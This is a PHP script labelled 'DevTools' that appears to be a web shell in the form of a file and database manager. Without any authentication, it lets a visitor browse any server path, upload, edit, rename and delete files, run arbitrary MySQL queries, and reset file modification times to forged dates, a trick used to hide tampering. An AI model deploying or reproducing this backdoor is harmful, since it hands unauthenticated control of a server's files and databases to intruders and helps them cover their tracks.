<?php
session_start();
ini_set('display_errors', 1);
error_reporting(E_ALL);

/* ============================================================
   HELPER: Init Session Defaults
   ============================================================ */
if (!isset($_SESSION['menu'])) $_SESSION['menu'] = 'files';
if (!isset($_SESSION['current_path'])) $_SESSION['current_path'] = getcwd();
if (!isset($_SESSION['db_conf'])) $_SESSION['db_conf'] = null;

/* ============================================================
   CLASS: File Manager
   ============================================================ */
class FileManager {
    private string $path;

    public function __construct(string $path) {
        $this->path = is_dir($path) ? realpath($path) : getcwd();
    }

    public function getPath(): string {
        return $this->path;
    }

    public function listItems(): array {
        try {
            $items = @scandir($this->path);
            if (!$items) return [];
            return array_values(array_diff($items, ['.', '..']));
        } catch (Throwable $e) {
            return [];
        }
    }

    public function createFile(string $name, string $content = ''): bool {
        return @file_put_contents($this->path . DIRECTORY_SEPARATOR . $name, $content) !== false;
    }

    public function createDir(string $name): bool {
        return @mkdir($this->path . DIRECTORY_SEPARATOR . $name, 0777, true);
    }

    public function delete(string $name): bool {
        $target = $this->path . DIRECTORY_SEPARATOR . $name;
        if (is_dir($target)) return $this->deleteRecursive($target);
        return is_file($target) ? @unlink($target) : false;
    }

    private function deleteRecursive(string $dir): bool {
        $items = @scandir($dir);
        if (!$items) return false;
        
        foreach (array_diff($items, ['.', '..']) as $file) {
            $full = $dir . DIRECTORY_SEPARATOR . $file;
            if (is_dir($full)) {
                $this->deleteRecursive($full);
            } else {
                @unlink($full);
            }
        }
        return @rmdir($dir);
    }

    public function rename(string $old, string $new): bool {
        return @rename($this->path . DIRECTORY_SEPARATOR . $old, $this->path . DIRECTORY_SEPARATOR . $new);
    }

    public function upload(array $file): bool {
        if (!is_uploaded_file($file['tmp_name'])) return false;
        return @move_uploaded_file($file['tmp_name'], $this->path . DIRECTORY_SEPARATOR . basename($file['name']));
    }

    public function getContent(string $name): ?string {
        $full = $this->path . DIRECTORY_SEPARATOR . $name;
        if (!is_file($full)) return null;
        return @file_get_contents($full);
    }

    public function saveContent(string $name, string $content): bool {
        return @file_put_contents($this->path . DIRECTORY_SEPARATOR . $name, $content) !== false;
    }

    public function touchFile(string $name, string $timestamp): bool {
        $target = $this->path . DIRECTORY_SEPARATOR . $name;
        $time = @strtotime($timestamp);
        if ($time === false) return false;
        return @touch($target, $time);
    }
}

/* ============================================================
   CLASS: Database Manager (MySQL)
   ============================================================ */
class DBManager {
    private PDO $pdo;

    public function __construct($host, $user, $pass, $dbname = null) {
        $dsn = "mysql:host=$host" . ($dbname ? ";dbname=$dbname" : "");
        $this->pdo = new PDO($dsn, $user, $pass);
        $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    }

    public function listDatabases(): array {
        return $this->pdo->query("SHOW DATABASES")->fetchAll(PDO::FETCH_COLUMN);
    }

    public function listTables(): array {
        return $this->pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
    }

    public function describeTable(string $table): array {
        return $this->pdo->query("DESCRIBE `$table`")->fetchAll(PDO::FETCH_ASSOC);
    }

    public function run(string $sql) {
        $stmt = $this->pdo->query($sql);
        return ($stmt->columnCount() > 0)
            ? $stmt->fetchAll(PDO::FETCH_ASSOC)
            : "Query OK";
    }
}

/* ============================================================
   POST ACTION PROCESSOR (NO GET USED)
   ============================================================ */

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    /* -------- SWITCH MENU -------- */
    if (isset($_POST['switch_menu'])) {
        $_SESSION['menu'] = $_POST['switch_menu'];
        header("Location: " . basename($_SERVER['PHP_SELF']));
        exit;
    }

    /* -------- FILE MANAGER ACTIONS -------- */
    if ($_SESSION['menu'] === 'files') {
        $fm = new FileManager($_SESSION['current_path']);

        if (isset($_POST['open_dir'])) {
            $newPath = $_POST['open_dir'];
            if (is_dir($newPath)) {
                $_SESSION['current_path'] = realpath($newPath);
            }
        }

        if (isset($_POST['create_file']) && isset($_POST['filename'])) {
            $fm->createFile($_POST['filename']);
        }

        if (isset($_POST['create_dir']) && isset($_POST['dirname'])) {
            $fm->createDir($_POST['dirname']);
        }

        if (isset($_POST['delete'])) {
            $fm->delete($_POST['delete']);
        }

        if (isset($_POST['rename_from'], $_POST['rename_to'])) {
            $fm->rename($_POST['rename_from'], $_POST['rename_to']);
        }

        if (isset($_FILES['upload'])) {
            $fm->upload($_FILES['upload']);
        }

        if (isset($_POST['touch_file'], $_POST['touch_time'])) {
            $fm->touchFile($_POST['touch_file'], $_POST['touch_time']);
        }

        if (isset($_POST['edit_name'], $_POST['edit_content'])) {
            $fm->saveContent($_POST['edit_name'], $_POST['edit_content']);
        }

        header("Location: " . basename($_SERVER['PHP_SELF']));
        exit;
    }

    /* -------- DATABASE ACTIONS -------- */
    if ($_SESSION['menu'] === 'database') {

        if (isset($_POST['db_connect'])) {
            $_SESSION['db_conf'] = [
                'host' => $_POST['host'],
                'user' => $_POST['user'],
                'pass' => $_POST['pass'],
                'dbname' => $_POST['dbname'] ?: null
            ];
        }

        if (isset($_POST['db_disconnect'])) {
            $_SESSION['db_conf'] = null;
        }

        if (isset($_POST['db_use'])) {
            $_SESSION['db_conf']['dbname'] = $_POST['db_use'];
        }

        if (isset($_POST['run_sql'])) {
            $_SESSION['db_sql'] = $_POST['sql'];
        }

        header("Location: " . basename($_SERVER['PHP_SELF']));
        exit;
    }
}

/* ============================================================
   Helper: safe display
   ============================================================ */
function h($s) { 
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); 
}

/* ============================================================
   UI: FILE MANAGER
   ============================================================ */

if ($_SESSION['menu'] === 'files') {
    $fm = new FileManager($_SESSION['current_path']);
    $items = $fm->listItems();
    $current = $fm->getPath();
    $parent = dirname($current);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>DevTools — Files</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#f6f7fb;margin:20px}
.header{display:flex;gap:12px;align-items:center;margin-bottom:12px}
.btn{display:inline-block;padding:6px 10px;border:1px solid #ccc;background:#fff;border-radius:4px;cursor:pointer;text-decoration:none;color:#111}
.btn:hover{background:#f9f9f9}
.container{background:#fff;padding:16px;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.04)}
.table{width:100%;border-collapse:collapse;margin-top:12px}
.table th,.table td{padding:8px;border-bottom:1px solid #e6e9ef;text-align:left;font-size:14px}
.table tr:hover{background:#f9fafb}
.small{font-size:12px;color:#666}
.form-inline{display:inline-block;margin:0 6px}
.hidden{display:none}
.editor-box{margin-top:12px;padding:12px;background:#fbfbff;border:1px solid #e3e3ff;border-radius:6px}
.input,textarea{padding:6px;border:1px solid #ccc;border-radius:4px;font-family:monospace}
textarea{width:100%;min-height:320px;resize:vertical}
.controls{margin-top:8px}
.badge{display:inline-block;padding:4px 8px;border-radius:999px;background:#eef;border:1px solid #cde;font-size:12px;color:#034}
</style>
</head>
<body>

<div class="header">
    <form method="post" style="margin:0">
        <input type="hidden" name="switch_menu" value="files">
        <button class="btn" type="submit">📁 Files</button>
    </form>

    <form method="post" style="margin:0">
        <input type="hidden" name="switch_menu" value="database">
        <button class="btn" type="submit">🗄️ Database</button>
    </form>

    <div style="margin-left:auto" class="small">Current: <span class="badge"><?= h($current) ?></span></div>
</div>

<div class="container">

    <div style="margin-bottom:12px">
        <?php if ($current !== $parent): ?>
        <form method="post" style="display:inline-block;margin-right:8px">
            <input type="hidden" name="open_dir" value="<?= h($parent) ?>">
            <button class="btn" type="submit">⬆ Up</button>
        </form>
        <?php endif; ?>

        <form method="post" style="display:inline-block;margin-right:8px">
            <input class="input" type="text" name="open_dir" placeholder="Open absolute path" style="width:420px" value="">
            <button class="btn" type="submit">Open</button>
        </form>

        <span class="small" style="margin-left:8px;color:#444">Tip: Paste absolute path to navigate</span>
    </div>

    <table class="table" role="table">
        <thead>
            <tr>
                <th style="width:48%">Name</th>
                <th style="width:12%">Type</th>
                <th style="width:18%">Modified</th>
                <th style="width:22%">Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php if (empty($items)): ?>
            <tr><td colspan="4" class="small">No items or cannot read directory.</td></tr>
        <?php else: ?>
            <?php foreach ($items as $item):
                $full = $current . DIRECTORY_SEPARATOR . $item;
                $isDir = is_dir($full);
                $mtime = is_file($full) ? date('Y-m-d H:i:s', filemtime($full)) : '-';
            ?>
            <tr>
                <td>
                    <?php if ($isDir): ?>
                        📁 <strong><?= h($item) ?></strong>
                    <?php else: ?>
                        📄 <?= h($item) ?>
                    <?php endif; ?>
                </td>
                <td><?= $isDir ? 'Folder' : 'File' ?></td>
                <td><?= h($mtime) ?></td>
                <td>

                    <?php if ($isDir): ?>
                        <form method="post" class="form-inline">
                            <input type="hidden" name="open_dir" value="<?= h($full) ?>">
                            <button class="btn" type="submit">Open</button>
                        </form>
                    <?php else: ?>
                        <button class="btn edit-toggle" data-file="<?= h($item) ?>">✏ Edit</button>
                    <?php endif; ?>

                    <form method="post" class="form-inline" onsubmit="return confirm('Delete <?= addslashes($item) ?> ?')">
                        <input type="hidden" name="delete" value="<?= h($item) ?>">
                        <button class="btn" type="submit">🗑 Delete</button>
                    </form>

                    <form method="post" class="form-inline">
                        <input type="hidden" name="rename_from" value="<?= h($item) ?>">
                        <input class="input" type="text" name="rename_to" placeholder="new-name" style="width:120px">
                        <button class="btn" type="submit">Rename</button>
                    </form>

                    <?php if (!$isDir): ?>
                    <form method="post" class="form-inline">
                        <input type="hidden" name="touch_file" value="<?= h($item) ?>">
                        <input class="input" type="text" name="touch_time" placeholder="YYYY-MM-DD HH:MM:SS" style="width:160px">
                        <button class="btn" type="submit">🕒 Touch</button>
                    </form>
                    <?php endif; ?>

                </td>
            </tr>

            <?php if (!$isDir):
                $content = $fm->getContent($item);
                $safeContent = $content === null ? '' : $content;
            ?>
            <tr class="editor-row hidden" data-file="<?= h($item) ?>">
                <td colspan="4">
                    <div class="editor-box">
                        <strong>Editing: <?= h($item) ?></strong>
                        <form method="post">
                            <input type="hidden" name="edit_name" value="<?= h($item) ?>">
                            <textarea name="edit_content" aria-label="Editor for <?= h($item) ?>"><?= h($safeContent) ?></textarea>
                            <div class="controls">
                                <button class="btn" type="submit">💾 Save</button>
                                <button type="button" class="btn cancel-edit">Cancel</button>
                            </div>
                        </form>
                    </div>
                </td>
            </tr>
            <?php endif; ?>

            <?php endforeach; ?>
        <?php endif; ?>
        </tbody>
    </table>

    <div style="margin-top:14px">
        <form method="post" style="display:inline-block;margin-right:12px">
            <input class="input" type="text" name="dirname" placeholder="New folder name">
            <button class="btn" type="submit" name="create_dir">Create Folder</button>
        </form>

        <form method="post" style="display:inline-block;margin-right:12px">
            <input class="input" type="text" name="filename" placeholder="New file name">
            <button class="btn" type="submit" name="create_file">Create File</button>
        </form>

        <form method="post" enctype="multipart/form-data" style="display:inline-block">
            <input type="file" name="upload" required>
            <button class="btn" type="submit">Upload</button>
        </form>
    </div>

</div>

<script>
document.addEventListener('DOMContentLoaded', function () {
    document.querySelectorAll('.edit-toggle').forEach(function(btn){
        btn.addEventListener('click', function(){
            const file = btn.getAttribute('data-file');
            document.querySelectorAll('.editor-row').forEach(r => {
                if (r.getAttribute('data-file') === file) {
                    r.classList.toggle('hidden');
                    if (!r.classList.contains('hidden')) r.scrollIntoView({behavior:'smooth', block:'center'});
                } else {
                    r.classList.add('hidden');
                }
            });
        });
    });
    document.querySelectorAll('.cancel-edit').forEach(function(b){
        b.addEventListener('click', function(){
            const row = b.closest('.editor-row');
            if (row) row.classList.add('hidden');
        });
    });
});
</script>

</body>
</html>

<?php
    exit;
}

/* ============================================================
   UI: DATABASE MANAGER
   ============================================================ */

if ($_SESSION['menu'] === 'database') {
    $dbConf = $_SESSION['db_conf'];
    $db = null;
    $dbError = null;

    if ($dbConf) {
        try {
            $db = new DBManager($dbConf['host'], $dbConf['user'], $dbConf['pass'], $dbConf['dbname']);
        } catch (Throwable $e) {
            $dbError = $e->getMessage();
            $db = null;
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>DevTools — Database</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#f6f7fb;margin:20px}
.container{background:#fff;padding:16px;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.04)}
.header{display:flex;gap:12px;align-items:center;margin-bottom:12px}
.btn{padding:6px 10px;border:1px solid #ccc;background:#fff;border-radius:4px;cursor:pointer;text-decoration:none;color:#111}
.btn:hover{background:#f9f9f9}
.table{width:100%;border-collapse:collapse;margin-top:12px}
.table th,.table td{padding:8px;border-bottom:1px solid #e6e9ef;text-align:left;font-size:14px}
.table tr:hover{background:#f9fafb}
.input,select,textarea{padding:6px;border:1px solid #ccc;border-radius:4px}
textarea{width:100%;min-height:180px;resize:vertical;font-family:monospace}
.small{font-size:12px;color:#666}
.badge{display:inline-block;padding:4px 8px;border-radius:999px;background:#eef;border:1px solid #cde;font-size:12px;color:#034}
.error{color:#b00;font-weight:bold;margin-bottom:12px}
pre{background:#f5f5f5;padding:12px;border-radius:4px;overflow:auto}
</style>
</head>
<body>

<div class="header">
    <form method="post" style="margin:0">
        <input type="hidden" name="switch_menu" value="files">
        <button class="btn" type="submit">📁 Files</button>
    </form>

    <form method="post" style="margin:0">
        <input type="hidden" name="switch_menu" value="database">
        <button class="btn" type="submit">🗄️ Database</button>
    </form>

    <div style="margin-left:auto" class="small">
        <?php if ($dbConf): ?>
            Connected: <span class="badge"><?= h($dbConf['host']) ?> / <?= h($dbConf['dbname'] ?: 'none') ?></span>
        <?php else: ?>
            Not connected
        <?php endif; ?>
    </div>
</div>

<div class="container">

<?php if ($dbError): ?>
    <div class="error">Connection Error: <?= h($dbError) ?></div>
<?php endif; ?>

<?php if (!$dbConf || !$db): ?>

    <h3>Connect to MySQL</h3>

    <form method="post">

        <label>Host:</label><br>
        <input class="input" type="text" name="host" placeholder="localhost" value="localhost" required><br><br>

        <label>User:</label><br>
        <input class="input" type="text" name="user" required><br><br>

        <label>Password:</label><br>
        <input class="input" type="password" name="pass"><br><br>

        <label>Database (optional):</label><br>
        <input class="input" type="text" name="dbname" placeholder="Leave empty to browse DB list"><br><br>

        <button class="btn" type="submit" name="db_connect">Connect</button>
    </form>

<?php else: ?>

    <form method="post" style="margin-bottom:16px">
        <button class="btn" name="db_disconnect">Disconnect</button>
    </form>

    <?php if (!$dbConf['dbname']): ?>

        <h3>Available Databases</h3>
        <table class="table">
            <tr><th>Name</th><th>Action</th></tr>
            <?php foreach ($db->listDatabases() as $dbname): ?>
            <tr>
                <td><?= h($dbname) ?></td>
                <td>
                    <form method="post">
                        <input type="hidden" name="db_use" value="<?= h($dbname) ?>">
                        <button class="btn" type="submit">USE</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>

    <?php else: ?>

        <h3>Tables in <strong><?= h($dbConf['dbname']) ?></strong></h3>
        <table class="table">
            <tr><th>Name</th><th>Structure</th></tr>
            <?php foreach ($db->listTables() as $tbl): ?>
            <tr>
                <td><?= h($tbl) ?></td>
                <td>
                    <form method="post" style="display:inline-block">
                        <input type="hidden" name="show_structure" value="<?= h($tbl) ?>">
                        <button class="btn" type="submit">View</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>

        <?php if (isset($_POST['show_structure'])):
            $table = $_POST['show_structure'];
            $desc = $db->describeTable($table);
        ?>
            <h3>Structure: <strong><?= h($table) ?></strong></h3>
            <table class="table">
                <tr>
                    <th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th>
                </tr>
                <?php foreach ($desc as $col): ?>
                <tr>
                    <td><?= h($col['Field']) ?></td>
                    <td><?= h($col['Type']) ?></td>
                    <td><?= h($col['Null']) ?></td>
                    <td><?= h($col['Key']) ?></td>
                    <td><?= h($col['Default'] ?? '') ?></td>
                    <td><?= h($col['Extra']) ?></td>
                </tr>
                <?php endforeach; ?>
            </table>
        <?php endif; ?>

        <hr>

        <h3>Run SQL Query</h3>
        <form method="post">
            <textarea name="sql" placeholder="SELECT * FROM table_name LIMIT 10;"><?= isset($_SESSION['db_sql']) ? h($_SESSION['db_sql']) : '' ?></textarea><br>
            <button class="btn" name="run_sql" type="submit">Run</button>
        </form>

        <?php if (isset($_POST['run_sql']) && isset($_SESSION['db_sql'])):
            try {
                $result = $db->run($_SESSION['db_sql']);
                echo "<h4>Result:</h4><pre>";
                print_r($result);
                echo "</pre>";
            } catch (Throwable $e) {
                echo "<div class='error'>SQL Error: " . h($e->getMessage()) . "</div>";
            }
        endif; ?>

    <?php endif; ?>

<?php endif; ?>

</div>

</body>
</html>

<?php
    exit;
}
?>
